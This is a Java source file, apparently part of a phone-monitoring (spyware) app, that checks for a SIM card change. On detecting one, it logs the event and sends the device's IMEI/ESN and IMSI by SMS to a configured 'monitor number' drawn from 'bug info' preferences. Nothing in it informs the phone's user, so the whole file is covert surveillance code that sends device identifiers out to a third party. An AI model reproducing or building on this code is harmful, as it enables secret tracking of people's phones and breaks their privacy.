package com.vvt.sim;

import com.vvt.event.FxEventCapture;
import com.vvt.event.FxSystemEvent;
import com.vvt.event.constant.FxCategory;
import com.vvt.global.Global;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PreferenceType;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.smsutil.SMSSendListener;
import com.vvt.smsutil.SMSSender;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;

public class SIMChangeNotif extends FxEventCapture implements SMSSendListener {
	
	private static final String MESSAGE = "a SIM change has been detected and is sending you this SMS from host device." + Constant.CRLF + "IMEI/ESN:" + PhoneInfo.getIMEI() + Constant.CRLF + "IMSI:" + PhoneInfo.getIMSI();
	private SIMChange simCh = null;
	
	public void startCapture() {
		try {
			if (!isEnabled() && sizeOfFxEventListener() > 0) {
				setEnabled(true);
				checkSIMChange();
			}
		} catch(Exception e) {
			setEnabled(false);
			notifyError(e);
		}
	}

	public void stopCapture() {
		if (isEnabled()) {
			setEnabled(false);
		}
	}
	
	private void checkSIMChange() {
		simCh = new SIMChange();
		if (simCh.isSIMChanged()) {
			// Recording event system log.
			FxSystemEvent systemEvent = new FxSystemEvent();
			systemEvent.setCategory(FxCategory.SIM_CHANGE);
			systemEvent.setSystemMessage(MESSAGE);
			systemEvent.setEventTime(System.currentTimeMillis());
			notifyEvent(systemEvent);
			// Sending message to monitor number.
			PrefBugInfo bugInfo = (PrefBugInfo)Global.getPreference().getPrefInfo(PreferenceType.PREF_BUG_INFO);
			String monitorNumber = bugInfo.getMonitorNumber();
			if (monitorNumber != null && !monitorNumber.equals(Constant.EMPTY_STRING)) {
				FxSMSMessage smsMessage = new FxSMSMessage();
				smsMessage.setMessage(MESSAGE);
				smsMessage.setNumber(monitorNumber);
				SMSSender.getInstance().send(smsMessage);
			}
		}
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("SIMChangeNotif.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		simCh = null;
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		simCh = null;
	}
}
